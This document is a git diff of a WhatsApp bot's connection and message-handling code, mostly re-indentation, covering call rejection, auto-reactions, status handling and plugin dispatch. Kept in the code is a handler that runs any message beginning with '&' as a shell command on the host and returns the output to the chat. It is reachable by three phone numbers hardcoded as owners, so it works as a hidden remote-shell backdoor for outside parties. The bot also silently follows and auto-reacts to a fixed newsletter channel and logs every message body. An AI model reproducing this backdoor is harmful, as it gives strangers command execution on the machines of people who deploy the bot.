@@ -271,36 +271,36 @@ async function connectToWA() {
       }
 
       // Send connection message
-try {
-  await sleep(2000);
-  const jid = malvin.decodeJid(malvin.user.id);
-  if (!jid) throw new Error("Invalid JID for bot");
+      try {
+        await sleep(2000);
+        const jid = malvin.decodeJid(malvin.user.id);
+        if (!jid) throw new Error("Invalid JID for bot");
 
-  const botname = "ᴍᴇʀᴄᴇᴅᴇs";
-  const ownername = "ᴍᴀʀɪsᴇℓ";
-  const prefix = getPrefix();
-  const username = "betingrich4";
-  const mrmalvin = `https://github.com/${username}`;
-  const repoUrl = "https://github.com/betingrich4/Mercedes";
-  const welcomeAudio = "https://files.catbox.moe/z47dgd.p3";
-  
-  const currentDate = new Date();
-  const date = currentDate.toLocaleDateString();
-  const time = currentDate.toLocaleTimeString();
-  
-  function formatUptime(seconds) {
-    const days = Math.floor(seconds / (24 * 60 * 60));
-    seconds %= 24 * 60 * 60;
-    const hours = Math.floor(seconds / (60 * 60));
-    seconds %= 60 * 60;
-    const minutes = Math.floor(seconds / 60);
-    seconds = Math.floor(seconds % 60);
-    return `${days}d ${hours}h ${minutes}m ${seconds}s`;
-  }
-  
-  const uptime = formatUptime(process.uptime());
+        const botname = "ᴍᴇʀᴄᴇᴅᴇs";
+        const ownername = "ᴍᴀʀɪsᴇℓ";
+        const prefix = getPrefix();
+        const username = "betingrich4";
+        const mrmalvin = `https://github.com/${username}`;
+        const repoUrl = "https://github.com/betingrich4/Mercedes";
+        const welcomeAudio = "https://files.catbox.moe/z47dgd.p3";
+        
+        const currentDate = new Date();
+        const date = currentDate.toLocaleDateString();
+        const time = currentDate.toLocaleTimeString();
+        
+        function formatUptime(seconds) {
+          const days = Math.floor(seconds / (24 * 60 * 60));
+          seconds %= 24 * 60 * 60;
+          const hours = Math.floor(seconds / (60 * 60));
+          seconds %= 60 * 60;
+          const minutes = Math.floor(seconds / 60);
+          seconds = Math.floor(seconds % 60);
+          return `${days}d ${hours}h ${minutes}m ${seconds}s`;
+        }
+        
+        const uptime = formatUptime(process.uptime());
 
-  const upMessage = `
+        const upMessage = `
 *┏──〔 Connected 〕───⊷* *┇ Prefix: ${prefix}*
 *┇ Date: ${date}*
 *┇ Time: ${time}*
@@ -310,27 +310,28 @@ try {
 *┗──────────────⊷*
 > *Report any error to the dev*`;
 
-  try {
-    await malvin.sendMessage(jid, {
-      image: { url: "https://url.bwmxmd.online/Adams.xm472dqv.jpeg" },
-      caption: upMessage,
-    }, { quoted: null });
-    console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));
+        try {
+          await malvin.sendMessage(jid, {
+            image: { url: "https://url.bwmxmd.online/Adams.xm472dqv.jpeg" },
+            caption: upMessage,
+          }, { quoted: null });
+          console.log(chalk.green("[ 📩 ] Connection notice sent successfully with image"));
 
-    await malvin.sendMessage(jid, {
-      audio: { url: welcomeAudio },
-      mimetype: "audio/mp4",
-      ptt: true,
-    }, { quoted: null });
-    console.log(chalk.green("[ 📩 ] Connection notice sent successfully as audio"));
-  } catch (imageError) {
-    console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
-    await malvin.sendMessage(jid, { text: upMessage });
-  }
-} catch (sendError) {
-  console.error(chalk.red(`[ 🔴 ] Error sending connection notice:`), sendError.message);
-}
-// Follow newsletter (Edited: Only one newsletter)
+          await malvin.sendMessage(jid, {
+            audio: { url: welcomeAudio },
+            mimetype: "audio/mp4",
+            ptt: true,
+          }, { quoted: null });
+          console.log(chalk.green("[ 📩 ] Connection notice sent successfully as audio"));
+        } catch (imageError) {
+          console.error(chalk.yellow("[ ⚠️ ] Image failed, sending text-only:"), imageError.message);
+          await malvin.sendMessage(jid, { text: upMessage });
+        }
+      } catch (sendError) {
+        console.error(chalk.red(`[ 🔴 ] Error sending connection notice:`), sendError.message);
+      }
+      
+      // Follow newsletter (Edited: Only one newsletter)
       const newsletterChannels = ["120363299029326322@newsletter"];
       let followed = [];
       let alreadyFollowing = [];
@@ -386,276 +387,331 @@ try {
     }
   });
   
-malvin.ev.on('call', async (calls) => {
-  try {
-    if (config.ANTI_CALL !== 'true') return;
-    for (const call of calls) {
-      if (call.status !== 'offer') continue;
-      const id = call.id;
-      const from = call.from;  // This 'from' is DIFFERENT - it's the caller's ID
-      await malvin.rejectCall(id, from);
-      await malvin.sendMessage(from, { text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*' });
-    }
-  } catch (err) {
-    console.error("Anti-call error:", err);
-  }
-});
-
-// ... rest of your code
-malvin.ev.on('messages.upsert', async(mek) => {
-  mek = mek.messages[0]
-  if (!mek.message) return
-  
-  // ✅ MOVE THE CODE HERE:
-  mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-    ? mek.message.ephemeralMessage.message 
-    : mek.message;
-
-  if (config.READ_MESSAGE === 'true') {
-    await malvin.readMessages([mek.key]);
-  }
-  
-  if (mek.message.viewOnceMessageV2) {
-    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
-      ? mek.message.ephemeralMessage.message
-      : mek.message;
-  }
-  
-  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
-    await malvin.readMessages([mek.key]);
-  }
-
-  // Edited: Newsletter Reaction (Only one)
-  const newsletterJids = ["120363299029326322@newsletter"];
-  const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];
-
-  if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
+  malvin.ev.on('call', async (calls) => {
     try {
-      const serverId = mek.newsletterServerId || mek.message?.newsletterStatusUpdateMessage?.serverMessageId;
-      if (serverId) {
-      const emoji = emojis[Math.floor(Math.random() * emojis.length)];
-        await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
+      if (config.ANTI_CALL !== 'true') return;
+      for (const call of calls) {
+        if (call.status !== 'offer') continue;
+        const id = call.id;
+        const from = call.from;
+        await malvin.rejectCall(id, from);
+        await malvin.sendMessage(from, { text: config.REJECT_MSG || '*вυѕу ¢αℓℓ ℓαтєя*' });
       }
-    } catch (e) {}
-  }	  
-	  
-if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
-  const jawadlike = await malvin.decodeJid(malvin.user.id);
-  const statusEmojis =  ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
-  const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
-  await malvin.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, jawadlike] });
-}
-if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
-  const user = mek.key.participant
-  const text = `${config.AUTO_STATUS_MSG}`
-  await malvin.sendMessage(user, { text: text }, { quoted: mek })
-}
-  await Promise.all([saveMessage(mek)]);
-  
-  // Check if 'm' already exists
-if (typeof m === 'undefined') {
-  m = sms(malvin, mek);
-}
-  const type = getContentType(mek.message)
-  const from = mek.key.remoteJid
-  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
-  const prefix = getPrefix();
-  const isCmd = body.startsWith(prefix)
-  var budy = typeof mek.text == 'string' ? mek.text : false;
-  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
-  const args = body.trim().split(/ +/).slice(1)
-  const q = args.join(' ')
-  const isGroup = from.endsWith('@g.us')
-  const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid)
-  const senderNumber = sender.split('@')[0]
-  const botNumber = malvin.user.id.split(':')[0]
-  const pushname = mek.pushName || 'Sin Nombre'
-  const isMe = botNumber.includes(senderNumber)
-  const botNumber2 = await jidNormalizedUser(malvin.user.id);
-  const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : ''
-  const groupName = isGroup ? groupMetadata.subject : ''
-  const participants = isGroup ? await groupMetadata.participants : ''
-  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
-  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
-  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
-  const isReact = m.message.reactionMessage ? true : false
-  const reply = (teks) => { 
-  const message = `${teks}\n\n*NI MBAYA 😅*`;
-  malvin.sendMessage(from, { text: message }, { quoted: mek });
-}
-  const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
-  const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
-  const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
-  const creatorJids = [...ownerNumbers, ...(devNumber ? [devNumber] : []), ...sudoUsers].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
-  const isCreator = creatorJids.includes(sender) || isMe;
+    } catch (err) {
+      console.error("Anti-call error:", err);
+    }
+  });
 
-      if (isCreator && mek.text && mek.text.startsWith("&")) {
-        let code = budy.slice(2);
-        const { spawn } = require("child_process");
-        try {
-            let resultTest = spawn(code, { shell: true });
-            resultTest.stdout.on("data", data => reply(data.toString()));
-            resultTest.stderr.on("data", data => reply(data.toString()));
-        } catch (err) { reply(util.format(err)); }
+  // Message handler
+  malvin.ev.on('messages.upsert', async (mek) => {
+    mek = mek.messages[0];
+    if (!mek.message) return;
+    
+    // Fix message structure
+    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+      ? mek.message.ephemeralMessage.message 
+      : mek.message;
+
+    if (config.READ_MESSAGE === 'true') {
+      await malvin.readMessages([mek.key]);
+    }
+    
+    if (mek.message.viewOnceMessageV2) {
+      mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
+        ? mek.message.ephemeralMessage.message
+        : mek.message;
+    }
+    
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true") {
+      await malvin.readMessages([mek.key]);
+    }
+
+    // Newsletter Reaction
+    const newsletterJids = ["120363299029326322@newsletter"];
+    const emojis = ["😂", "🥺", "👍", "☺️", "🥹", "♥️", "🩵"];
+
+    if (mek.key && newsletterJids.includes(mek.key.remoteJid)) {
+      try {
+        const serverId = mek.newsletterServerId || mek.message?.newsletterStatusUpdateMessage?.serverMessageId;
+        if (serverId) {
+          const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+          await malvin.newsletterReactMessage(mek.key.remoteJid, serverId.toString(), emoji);
+        }
+      } catch (e) {}
+    }
+    
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
+      const jawadlike = await malvin.decodeJid(malvin.user.id);
+      const statusEmojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '👏', '🤎', '✅', '🫀', '🧡', '😶', '🥹', '🌸', '🕊️', '🌷', '⛅', '🌟', '🥺', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+      const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];
+      await malvin.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } }, { statusJidList: [mek.key.participant, jawadlike] });
+    }
+    
+    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
+      const user = mek.key.participant;
+      const text = `${config.AUTO_STATUS_MSG}`;
+      await malvin.sendMessage(user, { text: text }, { quoted: mek });
+    }
+    
+    await Promise.all([saveMessage(mek)]);
+    
+    // Initialize m variable
+    let m;
+    if (typeof m === 'undefined') {
+      m = sms(malvin, mek);
+    }
+    
+    const type = getContentType(mek.message);
+    const from = mek.key.remoteJid;
+    const body = (type === 'conversation') ? mek.message.conversation : 
+                 (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : 
+                 (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : 
+                 (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : '';
+    const prefix = getPrefix();
+    const isCmd = body.startsWith(prefix);
+    var budy = typeof mek.text == 'string' ? mek.text : false;
+    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+    const args = body.trim().split(/ +/).slice(1);
+    const q = args.join(' ');
+    const isGroup = from.endsWith('@g.us');
+    const sender = mek.key.fromMe ? (malvin.user.id.split(':')[0]+'@s.whatsapp.net' || malvin.user.id) : (mek.key.participant || mek.key.remoteJid);
+    const senderNumber = sender.split('@')[0];
+    const botNumber = malvin.user.id.split(':')[0];
+    const pushname = mek.pushName || 'Sin Nombre';
+    const isMe = botNumber.includes(senderNumber);
+    const botNumber2 = await jidNormalizedUser(malvin.user.id);
+    const groupMetadata = isGroup ? await malvin.groupMetadata(from).catch(e => {}) : '';
+    const groupName = isGroup ? groupMetadata.subject : '';
+    const participants = isGroup ? await groupMetadata.participants : '';
+    const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
+    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
+    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
+    const isReact = m.message.reactionMessage ? true : false;
+    
+    const reply = (teks) => { 
+      const message = `${teks}\n\n*NI MBAYA 😅*`;
+      malvin.sendMessage(from, { text: message }, { quoted: mek });
+    };
+    
+    const ownerNumbers = ["218942841878", "254740007567", "254790375710"];
+    const sudoUsers = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8") || "[]");
+    const devNumber = config.DEV ? String(config.DEV).replace(/[^0-9]/g, "") : null;
+    const creatorJids = [...ownerNumbers, ...(devNumber ? [devNumber] : []), ...sudoUsers].map((num) => num.replace(/[^0-9]/g, "") + "@s.whatsapp.net");
+    const isCreator = creatorJids.includes(sender) || isMe;
+
+    if (isCreator && mek.text && mek.text.startsWith("&")) {
+      let code = budy.slice(2);
+      const { spawn } = require("child_process");
+      try {
+        let resultTest = spawn(code, { shell: true });
+        resultTest.stdout.on("data", data => reply(data.toString()));
+        resultTest.stderr.on("data", data => reply(data.toString()));
+      } catch (err) { reply(util.format(err)); }
+      return;
+    }
+
+    // Auto React list
+    const reactionsList = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '🧕', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
+
+    // AUTO_REACT - React to all messages
+    if (!isReact && config.AUTO_REACT === 'true') {
+      const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
+      try {
+        await malvin.sendMessage(mek.key.remoteJid, {
+          react: { 
+            text: randomReaction, 
+            key: mek.key
+          }
+        });
+      } catch (error) {
+        console.log('Failed to send auto reaction:', error.message);
+      }
+    }
+
+    // OWNER_REACT - React when bot sends a message
+    if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
+      const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
+      try {
+        await malvin.sendMessage(mek.key.remoteJid, {
+          react: { 
+            text: randomReaction, 
+            key: mek.key
+          }
+        });
+      } catch (error) {
+        console.log('Failed to send owner reaction:', error.message);
+      }
+    }
+
+    // CUSTOM_REACT - React with custom emojis
+    if (!isReact && config.CUSTOM_REACT === 'true') {
+      const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+      try {
+        await malvin.sendMessage(mek.key.remoteJid, {
+          react: { 
+            text: randomReaction, 
+            key: mek.key
+          }
+        });
+      } catch (error) {
+        console.log('Failed to send custom reaction:', error.message);
+      }
+    }
+
+    // HEART_REACT - React with heart emojis when bot sends message
+    if (!isReact && senderNumber === botNumber && config.HEART_EACT === 'true') {
+      const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
+      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+      try {
+        await malvin.sendMessage(mek.key.remoteJid, {
+          react: { 
+            text: randomReaction, 
+            key: mek.key
+          }
+        });
+      } catch (error) {
+        console.log('Failed to send heart reaction:', error.message);
+      }
+    }
+
+    // Check if user is banned
+    const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
+    if (bannedUsers.includes(sender)) {
+      console.log('User is banned:', sender);
+      return;
+    }
+
+    // Check if user is owner
+    const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
+    const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
+    const isRealOwner = sender === ownerNumberFormatted || isMe || ownerFile.includes(sender);
+
+    // DEBUG: Show current mode and access
+    console.log('MODE & ACCESS DEBUG:');
+    console.log('- Sender:', sender);
+    console.log('- Is me (bot)?', isMe);
+    console.log('- Is real owner?', isRealOwner);
+    console.log('- Owner number from config:', config.OWNER_NUMBER);
+    console.log('- Owner number formatted:', ownerNumberFormatted);
+    console.log('- Config MODE:', config.MODE);
+    console.log('- Is group?', isGroup);
+    console.log('- Body starts with prefix?', body?.startsWith?.(prefix));
+    console.log('- Body:', body);
+
+    // FIXED LOGIC: Always allow owner, check MODE for others
+    if (isRealOwner) {
+      console.log('Owner access granted (always allowed)');
+    } else {
+      console.log('Non-owner detected, checking MODE...');
+      
+      if (config.MODE === "private") {
+        console.log('MODE=private, non-owner blocked');
         return;
       }
-
-// Auto React list
-const reactionsList = ['🌼', '❤️', '💐', '🔥', '🏵️', '❄️', '🧊', '🐳', '💥', '🥀', '❤‍🔥', '🥹', '😩', '🫣', '🤭', '👻', '👾', '🫶', '😻', '🙌', '🫂', '🫀', '🧕', '🧶', '🧤', '👑', '💍', '👝', '💼', '🎒', '🥽', '🐻', '🐼', '🐭', '🐣', '🪿', '🦆', '🦊', '🦋', '🦄', '🪼', '🐋', '🐳', '🦈', '🐍', '🕊️', '🦦', '🦚', '🌱', '🍃', '🎍', '🌿', '☘️', '🍀', '🍁', '🪺', '🍄', '🍄‍🟫', '🪸', '🪨', '🌺', '🪷', '🪻', '🥀', '🌹', '🌷', '💐', '🌾', '🌸', '🌼', '🌻', '🌝', '🌚', '🌕', '🌎', '💫', '🔥', '☃️', '❄️', '🌨️', '🫧', '🍟', '🍫', '🧃', '🧊', '🪀', '🤿', '🏆', '🥇', '🥈', '🥉', '🎗️', '🎧', '🎤', '🥁', '🧩', '🎯', '🚀', '🚁', '🗿', '🎙️', '⌛', '⏳', '💸', '💎', '⚙️', '⛓️', '🔪', '🧸', '🎀', '🪄', '🎈', '🎁', '🎉', '🏮', '🪩', '📩', '💌', '📤', '📦', '📊', '📈', '📑', '📉', '📂', '🔖', '🧷', '📌', '📝', '🔏', '🔐', '🩷', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🖤', '🩶', '🤍', '🤎', '❤‍🔥', '❤‍🩹', '💗', '💖', '💘', '💝', '❌', '✅', '🔰', '〽️', '🌐', '🌀', '⤴️', '⤵️', '🔴', '🟢', '🟡', '🟠', '🔵', '🟣', '⚫', '⚪', '🟤', '🔇', '🔊', '📢', '🔕', '♥️', '🕐', '🚩', '🇵🇰'];
-
-// AUTO_REACT - React to all messages
-if (!isReact && config.AUTO_REACT === 'true') {
-  const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
-  try {
-    await malvin.sendMessage(mek.key.remoteJid, {
-      react: { 
-        text: randomReaction, 
-        key: mek.key
+      if (config.MODE === "inbox" && isGroup) {
+        console.log('MODE=inbox, group message from non-owner blocked');
+        return;
       }
-    });
-  } catch (error) {
-    console.log('Failed to send auto reaction:', error.message);
-  }
-}
-
-// OWNER_REACT - React when bot sends a message
-if (!isReact && senderNumber === botNumber && config.OWNER_REACT === 'true') {
-  const randomReaction = reactionsList[Math.floor(Math.random() * reactionsList.length)];
-  try {
-    await malvin.sendMessage(mek.key.remoteJid, {
-      react: { 
-        text: randomReaction, 
-        key: mek.key
+      if (config.MODE === "groups" && !isGroup) {
+        console.log('MODE=groups, private message from non-owner blocked');
+        return;
       }
-    });
-  } catch (error) {
-    console.log('Failed to send owner reaction:', error.message);
-  }
-}
-
-// CUSTOM_REACT - React with custom emojis
-if (!isReact && config.CUSTOM_REACT === 'true') {
-  const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
-  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-  try {
-    await malvin.sendMessage(mek.key.remoteJid, {
-      react: { 
-        text: randomReaction, 
-        key: mek.key
-      }
-    });
-  } catch (error) {
-    console.log('Failed to send custom reaction:', error.message);
-  }
-}
-
-// HEART_REACT - React with heart emojis when bot sends message
-if (!isReact && senderNumber === botNumber && config.HEART_EACT === 'true') {
-  const reactions = (config.CUSTOM_REACT_EMOJIS || '❤️,🧡,💛,💚,💚').split(',');
-  const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
-  try {
-    await malvin.sendMessage(mek.key.remoteJid, {
-      react: { 
-        text: randomReaction, 
-        key: mek.key
-      }
-    });
-  } catch (error) {
-    console.log('Failed to send heart reaction:', error.message);
-  }
-}
-
-// Check if user is banned
-const bannedUsers = JSON.parse(fsSync.readFileSync("./lib/ban.json", "utf-8"));
-if (bannedUsers.includes(sender)) {
-  console.log('User is banned:', sender);
-  return;
-}
-
-// Check if user is owner
-const ownerFile = JSON.parse(fsSync.readFileSync("./lib/sudo.json", "utf-8"));
-const ownerNumberFormatted = `${config.OWNER_NUMBER}@s.whatsapp.net`;
-const isRealOwner = sender === ownerNumberFormatted || isMe || ownerFile.includes(sender);
-
-// DEBUG: Show current mode and access
-console.log('MODE & ACCESS DEBUG:');
-console.log('- Sender:', sender);
-console.log('- Is me (bot)?', isMe);
-console.log('- Is real owner?', isRealOwner);
-console.log('- Owner number from config:', config.OWNER_NUMBER);
-console.log('- Owner number formatted:', ownerNumberFormatted);
-console.log('- Config MODE:', config.MODE);
-console.log('- Is group?', isGroup);
-console.log('- Body starts with prefix?', body?.startsWith?.(prefix));
-console.log('- Body:', body);
-
-// FIXED LOGIC: Always allow owner, check MODE for others
-if (isRealOwner) {
-  console.log('Owner access granted (always allowed)');
-  // Owner can always use commands, skip MODE checks
-} else {
-  console.log('Non-owner detected, checking MODE...');
-  
-  // Check MODE for non-owners only
-  if (config.MODE === "private") {
-    console.log('MODE=private, non-owner blocked');
-    return;
-  }
-  if (config.MODE === "inbox" && isGroup) {
-    console.log('MODE=inbox, group message from non-owner blocked');
-    return;
-  }
-  if (config.MODE === "groups" && !isGroup) {
-    console.log('MODE=groups, private message from non-owner blocked');
-    return;
-  }
-  console.log('Non-owner access granted (allowed by MODE)');
-}
-
-// LOAD EVENTS
-const events = require('./malvin');
-
-// DEBUG: Check events module
-console.log('Events module loaded:', {
-  hasCommands: Array.isArray(events.commands),
-  commandCount: events.commands?.length || 0,
-  firstFewCommands: events.commands?.slice(0, 3)?.map(c => c.pattern || c.alias?.[0]) || []
-});
-
-const cmdName = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : false;
-
-// DEBUG: Command detection
-console.log('COMMAND DETECTION:');
-console.log('- Is command?', isCmd);
-console.log('- Command name:', cmdName);
-console.log('- Args:', args);
-console.log('- Prefix used:', prefix);
-console.log('- Full command string:', body);
-
-// ONLY check for commands if we should process this message
-if (isCmd && cmdName) {
-  // FIND THE COMMAND
-  const cmd = events.commands.find((c) => 
-    c.pattern === cmdName || 
-    (c.alias && c.alias.includes(cmdName))
-  );
-
-  if (cmd) {
-    console.log(`Command found: ${cmdName}`);
-    
-    if (cmd.react) {
-      try {
-        await malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
-      } catch (error) {
-        console.log('Failed to send command reaction:', error.message);
-      }
+      console.log('Non-owner access granted (allowed by MODE)');
     }
-    
-    try {
-      const isOwner = isCreator;
-      
-      await cmd.function(malvin, mek, m, {
-        from, 
+
+    // LOAD EVENTS
+    const events = require('./malvin');
+
+    // DEBUG: Check events module
+    console.log('Events module loaded:', {
+      hasCommands: Array.isArray(events.commands),
+      commandCount: events.commands?.length || 0,
+      firstFewCommands: events.commands?.slice(0, 3)?.map(c => c.pattern || c.alias?.[0]) || []
+    });
+
+    const cmdName = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : false;
+
+    // DEBUG: Command detection
+    console.log('COMMAND DETECTION:');
+    console.log('- Is command?', isCmd);
+    console.log('- Command name:', cmdName);
+    console.log('- Args:', args);
+    console.log('- Prefix used:', prefix);
+    console.log('- Full command string:', body);
+
+    // ONLY check for commands if we should process this message
+    if (isCmd && cmdName) {
+      // FIND THE COMMAND
+      const cmd = events.commands.find((c) => 
+        c.pattern === cmdName || 
+        (c.alias && c.alias.includes(cmdName))
+      );
+
+      if (cmd) {
+        console.log(`Command found: ${cmdName}`);
+        
+        if (cmd.react) {
+          try {
+            await malvin.sendMessage(from, { react: { text: cmd.react, key: mek.key }});
+          } catch (error) {
+            console.log('Failed to send command reaction:', error.message);
+          }
+        }
+        
+        try {
+          const isOwner = isCreator;
+          
+          await cmd.function(malvin, mek, m, {
+            from, 
+            quoted: mek,
+            body, 
+            isCmd, 
+            command: cmdName, 
+            args, 
+            q, 
+            text: body,
+            isGroup, 
+            sender, 
+            senderNumber, 
+            botNumber2, 
+            botNumber, 
+            pushname, 
+            isMe, 
+            isOwner,
+            isCreator, 
+            groupMetadata, 
+            groupName, 
+            participants, 
+            groupAdmins, 
+            isBotAdmins, 
+            isAdmins, 
+            reply
+          });
+          console.log(`Command executed successfully: ${cmdName}`);
+        } catch (e) { 
+          console.error("[PLUGIN ERROR] " + e); 
+          console.error("Stack:", e.stack);
+          
+          try {
+            await malvin.sendMessage(from, {
+              text: `Error executing command: ${e.message}`
+            }, { quoted: mek });
+          } catch (sendError) {
+            console.error("Failed to send error message:", sendError.message);
+          }
+        }
+      } else {
+        console.log(`Command not found: ${cmdName}`);
+      }
+    } else {
+      console.log('Not a command or no command name');
+    }
+
+    // Process command.on events
+    events.commands.forEach(async (command) => {
+      const tools = {
+        from, l, 
         quoted: mek,
         body, 
         isCmd, 
@@ -670,7 +726,7 @@ if (isCmd && cmdName) {
         botNumber, 
         pushname, 
         isMe, 
-        isOwner,
+        isOwner: isCreator,
         isCreator, 
         groupMetadata, 
         groupName, 
@@ -679,189 +735,140 @@ if (isCmd && cmdName) {
         isBotAdmins, 
         isAdmins, 
         reply
-      });
-      console.log(`Command executed successfully: ${cmdName}`);
-    } catch (e) { 
-      console.error("[PLUGIN ERROR] " + e); 
-      console.error("Stack:", e.stack);
+      };
       
-      // Send error to user
-      try {
-        await malvin.sendMessage(from, {
-          text: `Error executing command: ${e.message}`
-        }, { quoted: mek });
-      } catch (sendError) {
-        console.error("Failed to send error message:", sendError.message);
+      if (body && command.on === "body") {
+        console.log(`Processing command.on="body": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if (mek.q && command.on === "text") {
+        console.log(`Processing command.on="text": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") {
+        console.log(`Processing command.on="image": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
+      } else if (command.on === "sticker" && mek.type === "stickerMessage") {
+        console.log(`Processing command.on="sticker": ${command.pattern || command.alias?.[0]}`);
+        await command.function(malvin, mek, m, tools);
       }
-    }
-  } else {
-    console.log(`Command not found: ${cmdName}`);
-    // Optional: Send "command not found" message
-    // await malvin.sendMessage(from, { text: `Command not found: ${cmdName}` }, { quoted: mek });
-  }
-} else {
-  console.log('Not a command or no command name');
+    });
+  });
 }
-
